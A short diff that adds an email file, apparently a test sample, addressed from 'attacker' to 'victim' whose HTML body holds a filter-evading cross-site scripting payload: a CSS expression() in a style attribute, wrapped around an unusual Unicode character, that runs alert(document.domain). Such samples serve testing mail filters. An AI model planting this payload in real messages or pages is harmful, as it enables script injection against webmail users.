@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: teq
+To: victim@qq.com
+MIME-Version: 1.0
+Content-type: text/html
+
+xssmail<style x="㊗" y="Fuzzitup {}*{xss:expression(alert(document.domain))}">
